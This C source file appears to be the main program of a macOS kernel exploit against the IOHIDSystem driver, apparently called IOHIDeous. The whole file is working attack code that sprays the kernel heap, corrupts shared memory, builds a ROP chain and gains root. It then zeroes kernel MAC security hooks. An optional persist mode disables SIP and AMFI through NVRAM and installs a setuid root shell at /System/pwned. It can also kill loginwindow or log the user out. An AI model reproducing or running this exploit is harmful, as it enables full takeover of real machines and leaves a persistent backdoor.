#include <errno.h>              // errno
#include <fcntl.h>              // open
#include <signal.h>             // SIG*, signal
#include <stdio.h>              // printf
#include <stdlib.h>             // atoi
#include <string.h>             // strerror, memset, memcpy, memmem
#include <unistd.h>             // usleep, getuid, setuid, write, close
#include <sys/stat.h>           // chmod
#include <sys/sysctl.h>         // sysctlbyname

#include <mach/mach.h>
#include <mach-o/loader.h>

#include <IOKit/IOReturn.h>     // kIO*
#include <IOKit/IOKitLib.h>     // IO*
#include <IOKit/hidsystem/IOHIDShared.h> // kIOHID

#include "common.h"             // LOG, ERR, FOREACH_CMD, filemap_t, map_file, unmap_file, pid_for_path
#include "config.h"             // OFFSET_AMOUNT
#include "exploit.h"            // shmem_get_rounded_size,
#include "heap.h"               // payload_*, heap_*
#include "kaslr.h"              // SLIDE_*, get_kernel_slide
#include "macf.h"               // mac_*
#include "obtain.h"             // steal_from_windowserver, kill_loginwindow, log_user_out
#include "rop.h"                // rop*

// From helper/helper_bin.c
extern const unsigned char helper[];
extern const unsigned int helper_len;

#define KERNEL_PATH "/System/Library/Kernels/kernel"
#define PWNAGE_PATH "/System/pwned"

const uint64_t SET_CURSOR_ENABLED_METHOD_INDEX = 2;

#ifdef IOHIDEOUS_READ /* false */
const uint64_t REGISTER_DISPLAY_METHOD_INDEX = 7;
const uint64_t UNREGISTER_DISPLAY_METHOD_INDEX = 8;
#endif

typedef struct
{
    uint64_t image1Size;
    uint64_t imageSize;
    uint32_t image1Pages;
    uint32_t imagePages;
    uint32_t booterStart;
    uint32_t smcStart;
    uint32_t booterDuration;
    uint32_t booterConnectDisplayDuration;
    uint32_t booterSplashDuration;
    uint32_t booterDuration0;
    uint32_t booterDuration1;
    uint32_t booterDuration2;
    uint32_t trampolineDuration;
    uint32_t kernelImageReadDuration;

    uint32_t graphicsReadyTime;
    uint32_t wakeNotificationTime;
    uint32_t lockScreenReadyTime;
    uint32_t hidReadyTime;

    uint32_t wakeCapability;
    uint32_t resvA[15];
} hibernate_statistics_t;

// signal handler
static void ignore(int signo)
{
    // do nothing
}

static kern_return_t setCursorEnabled(io_connect_t client, bool enable)
{
    uint64_t arg = enable;
    kern_return_t ret = IOConnectCallScalarMethod(client, SET_CURSOR_ENABLED_METHOD_INDEX, &arg, 1, NULL, NULL);
    if(ret == kIOReturnNoDevice)
    {
        ret = KERN_SUCCESS;
    }
    if(ret != KERN_SUCCESS)
    {
        ERR("Failed to %s cursor events: %s", enable ? "enable" : "disable", mach_error_string(ret));
    }
    return ret;
}

typedef struct
{
    io_connect_t client;
    uint64_t pagesize;
    uint64_t shmem_addr;
    rop_t *rop;
    const char **hib_names;
    uint32_t hib_lo;
    uint32_t vtab_lo;
} cb_args_t;

static kern_return_t cb(void *arg);

enum
{
    ACT_STEAL,
    ACT_KILL,
    ACT_LOGOUT,
    ACT_WAIT,
};

int main(int argc, const char **argv)
{
    if(argc < 2)
    {
        LOG("Usage: %s <steal|kill|logout|wait> [persist]", argv[0]);
        return 0;
    }

    uint32_t act;
    bool persist = false;
    if     (strcmp(argv[1], "steal")  == 0) act = ACT_STEAL;
    else if(strcmp(argv[1], "kill")   == 0) act = ACT_KILL;
    else if(strcmp(argv[1], "logout") == 0) act = ACT_LOGOUT;
    else if(strcmp(argv[1], "wait")   == 0) act = ACT_WAIT;
    else
    {
        ERR("Unrecognized argument: %s", argv[1]);
        return 1;
    }

    if(argc >= 3)
    {
        if(strcmp(argv[2], "persist") == 0)
        {
            persist = true;
        }
        else
        {
            ERR("Unrecognized argument: %s", argv[2]);
            return 1;
        }
    }

    // Persist across logouts and live longer before shutdowns
    signal(SIGTERM, ignore);
    signal(SIGHUP, ignore);

    // Initialization
    int retval = 1;
    kern_return_t ret;
    uid_t orig_uid = getuid();

    LOG("Mapping kernel...");
    filemap_t kernel;
    if(map_file(&kernel, KERNEL_PATH) != 0)
    {
        goto out0;
    }

    rop_t rop = { 0 };
    if(rop_gadgets(&rop, kernel.buf) != 0)
    {
        goto out1;
    }

    uint64_t slide = get_kernel_slide(kernel.buf);
    if((slide % SLIDE_STEP) != 0)
    {
        goto out1;
    }

    for(uint64_t *ptr = (uint64_t*)&rop, *end = (uint64_t*)&rop.taggedRelease_vtab_offset; ptr < end; ++ptr)
    {
        *ptr += slide;
    }

    task_t self = mach_task_self();
    LOG("self: 0x%x", self);

    // Zalloc zone sizes go up to two page sizes,
    // so in order to get out of there we go for three pages.
    host_t host = mach_host_self();
    LOG("host: 0x%x", host);

    vm_size_t pagesize;
    host_page_size(host, &pagesize);
    size_t rounded_size = pagesize * 3;
    LOG("Using struct size 0x%lx", rounded_size);

    uint32_t payload_offset = 0;
    if(!heap_init(rounded_size))
    {
        goto out1;
    }

    mach_port_t master = MACH_PORT_NULL;
    ret = host_get_io_master(host, &master);
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(master))
    {
        ERR("Failed to get IOKit master port: %s", mach_error_string(ret));
        goto out1;
    }

    io_service_t service = IOServiceGetMatchingService(master, IOServiceMatching("IOHIDSystem"));
    if(!MACH_PORT_VALID(service))
    {
        ERR("Failed to get IOHIDSystem handle");
        goto out1;
    }
    LOG("IOHIDSystem service: 0x%x", service);

    LOG("Spraying heap...");
    ret = heap_spray(master, 0, heap_payload_small, heap_payload_small_len, NULL, NULL);
    if(ret != KERN_SUCCESS)
    {
        goto out1;
    }

    io_connect_t client = MACH_PORT_NULL;
    switch(act)
    {
        case ACT_STEAL:
            client = steal_from_windowserver();
            goto got_client;
        case ACT_KILL:
            if(!kill_loginwindow())
            {
                goto out2;
            }
            break;
        case ACT_LOGOUT:
            if(!log_user_out())
            {
                goto out2;
            }
            break;
    }
    LOG("Waiting for IOHIDUserClient...");
    do
    {
        ret = IOServiceOpen(service, self, kIOHIDServerConnectType, &client);
        usleep(10);
    } while(ret == kIOReturnBusy);
    if(ret != KERN_SUCCESS)
    {
        ERR("Failed to spawn IOHIDUserClient: %s", mach_error_string(ret));
        goto out2;
    }
    got_client:;
    if(!MACH_PORT_VALID(client))
    {
        goto out2;
    }
    LOG("IOHIDUserClient: 0x%x", client);
    if(act == ACT_STEAL)
    {
        if(setCursorEnabled(client, false) != KERN_SUCCESS)
        {
            goto out3;
        }
    }

    mach_vm_address_t shmem_addr = 0;
    mach_vm_size_t shmem_size = 0;
    LOG("Mapping IOHID shared memory...");
    ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, self, &shmem_addr, &shmem_size, kIOMapAnywhere);
    if(ret != KERN_SUCCESS)
    {
        LOG("IOHID shared memory not initialized yet, hold on...");

        LOG("Punching a hole for shared memory...");
        ret = heap_set(master, 0, NULL, 0);
        if(ret != KERN_SUCCESS)
        {
            ERR("Failed to punch a heap hole: %s", mach_error_string(ret));
            goto out3;
        }
        payload_offset = 1;

        LOG("Allocating shared memory...");
        ret = shmem_init(client);
        if(ret != KERN_SUCCESS)
        {
            ERR("Failed to create IOHID shared memory: %s", mach_error_string(ret));
            goto out3;
        }

        LOG("Trying to map IOHID shared memory again...");
        ret = IOConnectMapMemory64(client, kIOHIDGlobalMemory, self, &shmem_addr, &shmem_size, kIOMapAnywhere);
        if(ret != KERN_SUCCESS)
        {
            ERR("Failed to map IOHID shared memory: %s", mach_error_string(ret));
            goto out3;
        }
    }
    LOG("Shmem: 0x%016llx-0x%016llx", shmem_addr, shmem_addr + shmem_size);

    // This demonstrates how one could in theory leak data off the kernel heap.
    // We need to first spray the heap so that we can offset evg without panicking.
    // Since that overwrites a lot of memory, we need to pick your heap spray carefully.
    // Once the structure is moved, we need to re-spray the heap in order to get
    // a useful value into a readable location. For that we use _cursorHelper,
    // which will be used in initialization and which we can trigger to cache the
    // shmem value by changing the display bounds of a virtual display.
    // Since the page size is 0x1000 and the minimum struct size to get out of zalloc
    // is 3 pages, there is only a 1/3 chance that we will get the offset right.
    // We only know whether we did so after moving evg back, so if we failed we have to
    // re-spray the heap and start again, which, on average, takes an eternity.

    // For that reason and because I know of no structures that could be used to leak the slide this way,
    // this code is disabled by default and the kernel slide is obtained by means of a timing attack.
#ifdef IOHIDEOUS_READ /* false */
    LOG("Registering virtual display...");
    uint64_t screen = 0;
    uint32_t cnt = 1;
    ret = IOConnectCallScalarMethod(client, REGISTER_DISPLAY_METHOD_INDEX, NULL, 0, &screen, &cnt);
    if(ret != KERN_SUCCESS)
    {
        LOG("Failed to register virtual display: %s", mach_error_string(ret));
        goto out3;
    }

    uint32_t leak = 0;
    for(int off = 0x1000; leak == 0; off = (off + 0x1000) % rounded_size)
    {
        if(leak_uint32_prepare(client, shmem_addr, OFFSET_AMOUNT + off) != KERN_SUCCESS)
        {
            goto out3;
        }

        LOG("Re-spraying heap...");
        ret = heap_spray(master, payload_offset, heap_payload_big, heap_payload_big_len, NULL, NULL);
        if(ret != KERN_SUCCESS)
        {
            shmem_init(client); // Can't leave this in a broken state
            goto out3;
        }

        if(leak_uint32(client, shmem_addr, screen, &leak) != KERN_SUCCESS)
        {
            goto out3;
        }

        LOG("0x%x", leak);

        LOG("Resetting heap...");
        ret = heap_spray(master, payload_offset, heap_payload_small, heap_payload_small_len, NULL, NULL);
        if(ret != KERN_SUCCESS)
        {
            goto out3;
        }
    }

    IOConnectCallScalarMethod(client, UNREGISTER_DISPLAY_METHOD_INDEX, &screen, 1, NULL, NULL);
#endif

    LOG("Putting fake vtable in kernel memory...");
    hibernate_statistics_t hib, hib_old;
    uint32_t *hib_base = &hib.graphicsReadyTime;
    uint32_t *hib_save = &hib_old.graphicsReadyTime;

    uint64_t ptr_addr = rop._hibernateStats + ((uint8_t*)&hib_base[2] - (uint8_t*)&hib) - rop.taggedRelease_vtab_offset;
    uint32_t *ptr_ptr = (uint32_t*)&ptr_addr;
    uint64_t rop_addr = rop.add__rdi__ecx;
    uint32_t *rop_ptr = (uint32_t*)&rop_addr;
    hib.graphicsReadyTime    = ptr_ptr[0];
    hib.wakeNotificationTime = ptr_ptr[1];
    hib.lockScreenReadyTime  = rop_ptr[0];
    hib.hidReadyTime         = rop_ptr[1];
    const char *hib_names[] =
    {
        "kern.hibernategraphicsready",
        "kern.hibernatewakenotification",
        "kern.hibernatelockscreenready",
        "kern.hibernatehidready",
    };
    for(size_t i = 0; i < 4; ++i)
    {
        size_t size = sizeof(uint32_t);
        if(sysctlbyname(hib_names[i], &hib_save[i], &size, &hib_base[i], size) != 0)
        {
            ERR("sysctl(\"%s\") failed: %s", hib_names[i], strerror(errno));
            goto out3;
        }
    }

    LOG("Rewriting object pointer...");
    uint64_t hib_addr = rop._hibernateStats + ((uint8_t*)hib_base - (uint8_t*)&hib);
    uint32_t *hib_ptr = (uint32_t*)&hib_addr;
    for(int off = 0x0; off < 3 * pagesize; off += pagesize)
    {
        if(write_uint32(client, shmem_addr, OFFSET_AMOUNT + off, hib_ptr[0]) != KERN_SUCCESS)
        {
            goto out3;
        }
    }

    LOG("Triggering exploit...");
    cb_args_t args =
    {
        .client = client,
        .pagesize = pagesize,
        .shmem_addr = shmem_addr,
        .rop = &rop,
        .hib_names = hib_names,
        .hib_lo = hib_ptr[0],
        .vtab_lo = ptr_ptr[0],
    };
    ret = heap_spray(master, payload_offset, NULL, 0, &cb, &args);
    if(ret != KERN_SUCCESS)
    {
        goto out3;
    }

    uid_t uid = getuid();
    if(uid != 0)
    {
        ERR("Exploit failed, got no root :(");
        goto out4;
    }
    // Don't announce root if we already were root to begin with
    if(orig_uid != 0)
    {
        LOG("Got r00t!");
    }

    // Update itk_host to realhost
    if(setuid(0) != 0)
    {
        ERR("Failed to setuid(0) (the hell, I thought we were root?)");
        goto out4;
    }
    // This is different from host now, if orig_uid != 0
    host_t realhost = mach_host_self();
    LOG("realhost: 0x%x", realhost);

    task_t kernel_task = MACH_PORT_NULL;
    ret = host_get_special_port(realhost, HOST_LOCAL_NODE, 4, &kernel_task);
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(kernel_task))
    {
        ERR("Failed to get kernel task port: %s (port = 0x%x)", mach_error_string(ret), kernel_task);
        goto out4;
    }
    LOG("kernel_task: 0x%x", kernel_task);

    mach_port_array_t arr;
    mach_msg_type_number_t num;
    ret = mach_ports_lookup(kernel_task, &arr, &num);
    if(ret == KERN_SUCCESS)
    {
        for(size_t i = 0; i < num; ++i)
        {
            mach_port_deallocate(self, arr[i]);
        }
    }
    else
    {
        ERR("Failure: kernel task port is restricted.");
        goto out4;
    }

    // Patch the kernel
    LOG("Patching kernel...");
#define KREAD(var, addr) \
do \
{ \
    if(task_read(kernel_task, (addr), sizeof(var), &var) != sizeof(var)) \
    { \
        ERR("Failed to read %s from 0x%016llx", #var, (addr)); \
        goto out4; \
    } \
} while(0)
#define KWRITE(var, addr) \
do \
{ \
    if(task_write(kernel_task, (addr), sizeof(var), &var) != sizeof(var)) \
    { \
        ERR("Failed to write %s to 0x%016llx", #var, (addr)); \
        goto out4; \
    } \
} while(0)
    mac_policy_list_t mpl;
    KREAD(mpl, rop.mac_policy_list);
    for(uint32_t i = 0; i < mpl.staticmax; ++i)
    {
        mac_policy_list_entry_t mple;
        uint64_t mple_addr = mpl.entries + i * sizeof(uint64_t);
        KREAD(mple, mple_addr);
        if(mple.mpc != 0)
        {
            LOG("Reading MAC policy at 0x%016llx...", mple.mpc);
            mac_policy_conf_t mpc;
            KREAD(mpc, mple.mpc);

            // Remove file access and NVRAM hooks
            LOG("Removing hooks from 0x%016llx...", mpc.mpc_ops);
            mac_policy_ops_t mpc_ops;
            KREAD(mpc_ops, mpc.mpc_ops);

            mpc_ops.mpo_file_check_change_offset        = 0;
            mpc_ops.mpo_file_check_create               = 0;
            mpc_ops.mpo_file_check_dup                  = 0;
            mpc_ops.mpo_file_check_fcntl                = 0;
            mpc_ops.mpo_file_check_get_offset           = 0;
            mpc_ops.mpo_file_check_get                  = 0;
            mpc_ops.mpo_file_check_inherit              = 0;
            mpc_ops.mpo_file_check_ioctl                = 0;
            mpc_ops.mpo_file_check_lock                 = 0;
            mpc_ops.mpo_file_check_mmap_downgrade       = 0;
            mpc_ops.mpo_file_check_mmap                 = 0;
            mpc_ops.mpo_file_check_receive              = 0;
            mpc_ops.mpo_file_check_set                  = 0;
            mpc_ops.mpo_file_check_library_validation   = 0;

            mpc_ops.mpo_vnode_check_rename              = 0;
            mpc_ops.mpo_vnode_check_getattr             = 0;
            mpc_ops.mpo_vnode_check_clone               = 0;
            mpc_ops.mpo_vnode_check_access              = 0;
            mpc_ops.mpo_vnode_check_chdir               = 0;
            mpc_ops.mpo_vnode_check_chroot              = 0;
            mpc_ops.mpo_vnode_check_create              = 0;
            mpc_ops.mpo_vnode_check_deleteextattr       = 0;
            mpc_ops.mpo_vnode_check_exchangedata        = 0;
            mpc_ops.mpo_vnode_check_exec                = 0;
            mpc_ops.mpo_vnode_check_getattrlist         = 0;
            mpc_ops.mpo_vnode_check_getextattr          = 0;
            mpc_ops.mpo_vnode_check_ioctl               = 0;
            mpc_ops.mpo_vnode_check_kqfilter            = 0;
            mpc_ops.mpo_vnode_check_label_update        = 0;
            mpc_ops.mpo_vnode_check_link                = 0;
            mpc_ops.mpo_vnode_check_listextattr         = 0;
            mpc_ops.mpo_vnode_check_lookup              = 0;
            mpc_ops.mpo_vnode_check_open                = 0;
            mpc_ops.mpo_vnode_check_read                = 0;
            mpc_ops.mpo_vnode_check_readdir             = 0;
            mpc_ops.mpo_vnode_check_readlink            = 0;
            mpc_ops.mpo_vnode_check_rename_from         = 0;
            mpc_ops.mpo_vnode_check_rename_to           = 0;
            mpc_ops.mpo_vnode_check_revoke              = 0;
            mpc_ops.mpo_vnode_check_select              = 0;
            mpc_ops.mpo_vnode_check_setattrlist         = 0;
            mpc_ops.mpo_vnode_check_setextattr          = 0;
            mpc_ops.mpo_vnode_check_setflags            = 0;
            mpc_ops.mpo_vnode_check_setmode             = 0;
            mpc_ops.mpo_vnode_check_setowner            = 0;
            mpc_ops.mpo_vnode_check_setutimes           = 0;
            mpc_ops.mpo_vnode_check_stat                = 0;
            mpc_ops.mpo_vnode_check_truncate            = 0;
            mpc_ops.mpo_vnode_check_unlink              = 0;
            mpc_ops.mpo_vnode_check_write               = 0;
            mpc_ops.mpo_vnode_check_signature           = 0;
            mpc_ops.mpo_vnode_check_uipc_bind           = 0;
            mpc_ops.mpo_vnode_check_uipc_connect        = 0;
            mpc_ops.mpo_vnode_check_searchfs            = 0;
            mpc_ops.mpo_vnode_check_fsgetpath           = 0;
            mpc_ops.mpo_vnode_check_setacl              = 0;

            mpc_ops.mpo_iokit_check_nvram_get           = 0;
            mpc_ops.mpo_iokit_check_nvram_set           = 0;
            mpc_ops.mpo_iokit_check_nvram_delete        = 0;

            KWRITE(mpc_ops, mpc.mpc_ops);
        }
    }

    io_service_t nvram = MACH_PORT_NULL;
    CFMutableDictionaryRef nvars = NULL,
                           dict  = NULL;

    if(persist)
    {
        LOG("Patching NVRAM...");
        // Disable SIP and AMFI
        nvram = IOServiceGetMatchingService(master, IOServiceMatching("IODTNVRAM"));
        if(!MACH_PORT_VALID(nvram))
        {
            ERR("Failed to get NVRAM service handle");
            goto out4;
        }

        ret = IORegistryEntryCreateCFProperties(nvram, &nvars, NULL, 0);
        if(ret != KERN_SUCCESS || nvars == NULL)
        {
            ERR("Failed to get NVRAM variables: %s (nvars = %p)", mach_error_string(ret), nvars);
            goto out5;
        }

        dict = CFDictionaryCreateMutable(NULL, 0, &kCFCopyStringDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if(dict == NULL)
        {
            ERR("Failed to create CFDictionary");
            goto out5;
        }

        const uint32_t csr_config = 0x1ff;
        CFDataRef csr_data = CFDataCreateWithBytesNoCopy(NULL, (uint8_t*)&csr_config, sizeof(csr_config), kCFAllocatorNull);
        if(csr_data == NULL)
        {
            ERR("Failed to create CFData");
            goto out5;
        }

        CFDictionarySetValue(dict, CFSTR("csr-active-config"), csr_data);

        CFStringRef boot_args = NULL;
        const char str[] = "amfi_get_out_of_my_way=1 ";
        CFStringRef old_args = CFDictionaryGetValue(nvars, CFSTR("boot-args"));
        if(old_args == NULL) // No boot args exist
        {
            boot_args = CFStringCreateWithCString(NULL, str, kCFStringEncodingUTF8);
        }
        else if(CFGetTypeID(old_args) != CFStringGetTypeID()) // type safety
        {
            ERR("boot-args variable is not of type CFString");
            goto out5;
        }
        else if(memmem(CFStringGetCStringPtr(old_args, kCFStringEncodingUTF8), CFStringGetLength(old_args), str, sizeof(str) - 2) != NULL) // amfi_get_out_of_my_way already set
        {
            boot_args = CFStringCreateCopy(NULL, old_args);
        }
        else // Have boot args, but no amfi_get_out_of_my_way
        {
            CFMutableStringRef ba = CFStringCreateMutable(NULL, 0);
            if(ba)
            {
                CFStringAppendCString(ba, str, kCFStringEncodingUTF8);
                CFStringAppend(ba, old_args);
            }
            boot_args = ba;
        }

        if(boot_args == NULL)
        {
            ERR("Failed to create CFData");
            goto out5;
        }
        CFDictionarySetValue(dict, CFSTR("boot-args"), boot_args);

        ret = IORegistryEntrySetCFProperties(nvram, dict);
        if(ret != KERN_SUCCESS)
        {
            ERR("Failed to set NVRAM variables: %s", mach_error_string(ret));
            goto out5;
        }

        // Install our "helper"
        LOG("Installing root shell...");
        int fd = open(PWNAGE_PATH, O_WRONLY | O_CREAT);
        if(fd == -1)
        {
            ERR("Failed to open " PWNAGE_PATH " for writing: %s", strerror(errno));
            goto out5;
        }
        if(write(fd, helper, helper_len) == -1)
        {
            ERR("Failed to write to " PWNAGE_PATH ": %s", strerror(errno));
            goto out5;
        }
        if(fchown(fd, 0, 0) != 0)
        {
            ERR("Failed to chown root shell: %s", strerror(errno));
            goto out5;
        }
        if(fchmod(fd, 04775) != 0)
        {
            ERR("Failed to chmod root shell: %s", strerror(errno));
            goto out5;
        }
        close(fd);
        LOG("Installed root shell to " PWNAGE_PATH);
    }

    LOG("All done, enjoy! :)");
    printf
    (
        "\n"
        "\x1b[91m╔══╗╔═══════╗╔══╗ ╔══╗╔══╗╔══════╗ ╔══════╗╔═══════╗╔══╗ ╔══╗╔═══════╗\x1b[0m\n"
        "\x1b[93m║  ║║  ╔═╗  ║║  ║ ║  ║║  ║║  ╔╗  ╚╗║  ╔═══╝║  ╔═╗  ║║  ║ ║  ║║  ╔════╝\x1b[0m\n"
        "\x1b[92m║  ║║  ║ ║  ║║  ╚═╝  ║║  ║║  ║ ║  ║║  ╚══╗ ║  ║ ║  ║║  ║ ║  ║║  ╚════╗\x1b[0m\n"
        "\x1b[96m║  ║║  ║ ║  ║║  ╔═╗  ║║  ║║  ║ ║  ║║  ╔══╝ ║  ║ ║  ║║  ║ ║  ║╚════╗  ║\x1b[0m\n"
        "\x1b[95m║  ║║  ╚═╝  ║║  ║ ║  ║║  ║║  ╚╝  ╔╝║  ╚═══╗║  ╚═╝  ║║  ╚═╝  ║╔════╝  ║\x1b[0m\n"
        "\x1b[94m╚══╝╚═══════╝╚══╝ ╚══╝╚══╝╚══════╝ ╚══════╝╚═══════╝╚═══════╝╚═══════╝\x1b[0m\n"
    );

    retval = 0;

    // Cleanup
    out5:;
    if(MACH_PORT_VALID(nvram))
    {
        IOObjectRelease(nvram);
    }
    if(nvars != NULL)
    {
        CFRelease(nvars);
    }
    if(dict != NULL)
    {
        CFRelease(dict);
    }

    out4:;
    for(size_t i = 0; i < 4; ++i)
    {
        sysctlbyname(hib_names[i], NULL, NULL, &hib_save[i], sizeof(uint32_t));
    }

    out3:;
    shmem_init(client); // Clean up our ROP chain
    if(act == ACT_STEAL)
    {
        setCursorEnabled(client, true);
        mach_port_deallocate(mach_task_self(), client);
    }
    else
    {
        IOServiceClose(client);
    }

    out2:;
    IOObjectRelease(service);

    out1:;
    unmap_file(&kernel);

    out0:;
    return retval;
}

static kern_return_t cb(void *arg)
{
    static bool ran = false;

    // No point in running if we already did
    if(ran)
    {
        return KERN_SUCCESS;
    }

    cb_args_t *args = arg;

    // Trick: shmem can have upper 32 bits 0xffffff91 or 0xffffff92, but
    // the lower 32 bits are either very high or very low depending on that.
    // Perfect case for signed int addition. :P
    int32_t val = 0;
    size_t size = sizeof(uint32_t);
    if(sysctlbyname(args->hib_names[0], &val, &size, NULL, 0) != 0)
    {
        printf("\n");
        ERR("sysctl(\"%s\") failed: %s", args->hib_names[0], strerror(errno));
        return KERN_FAILURE;
    }

    // No change, no action
    if(val == args->vtab_lo)
    {
        return KERN_SUCCESS;
    }
    // If the value DID change, then we just leaked an address and
    // can now prepare the stage 2 payload.

    // Our calculated address has the chance of being off by one or two pages,
    // but that's nothing we can't handle ;)
    val -= args->vtab_lo + OFFSET_AMOUNT;
    uint64_t kernel_addr = 0xffffff9200000000ULL + val;
    printf("\n");
    LOG("Shmem kernel address: 0x%016llx", kernel_addr);

    // Get address of shmem into hib
    uint32_t *addr = (uint32_t*)&kernel_addr;
    for(size_t i = 0; i < 2; ++i)
    {
        if(sysctlbyname(args->hib_names[i], NULL, NULL, &addr[i], sizeof(*addr)) != 0)
        {
            ERR("sysctl(\"%s\") failed: %s", args->hib_names[i], strerror(errno));
            return KERN_FAILURE;
        }
    }

    // In this callback function, our corrupted object at offset OFFSET_AMOUNT has been freed.
    // Using 2 full payload sized guarantees that we land in an object that still exists.
    int32_t add = OFFSET_AMOUNT + 2 * (HEAP_PAYLOAD_NUM_ARRAYS * 3 * args->pagesize);
    for(int off = 0x0; off < 3 * args->pagesize; off += args->pagesize)
    {
        kern_return_t ret = write_uint32(args->client, args->shmem_addr, add + off, args->hib_lo);
        if(ret != KERN_SUCCESS)
        {
            return ret;
        }
    }

    // Put ROP chain at all possible locations
    rop_chain(args->rop, (void*)args->shmem_addr, kernel_addr);
    memcpy((void*)(args->shmem_addr +     args->pagesize), (void*)args->shmem_addr, args->pagesize);
    memcpy((void*)(args->shmem_addr + 2 * args->pagesize), (void*)args->shmem_addr, args->pagesize);

    ran = true;
    return KERN_SUCCESS;
}
